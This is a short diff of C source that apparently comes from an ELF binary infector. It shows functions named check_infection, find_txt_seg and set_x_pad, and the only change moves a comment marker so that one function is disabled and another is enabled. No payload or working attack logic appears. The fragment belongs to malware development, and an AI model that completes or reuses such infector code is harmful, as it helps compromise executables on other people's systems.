@@ -151,7 +151,7 @@ static int		check_infection(void) {
 		return (-1);
 	return (0);
 }
-
+/*
 static int		find_txt_seg(void) {
 	Elf64_Phdr	*p_hdr;
 	uint64_t	i;
@@ -165,7 +165,7 @@ static int		find_txt_seg(void) {
 	hdrs.nxt = p_hdr;
 	return (0);
 }
-/*
+
 static int		set_x_pad(void) {
 	Elf64_Phdr	*p_hdr;
 	Elf64_Shdr	*s_hdr;
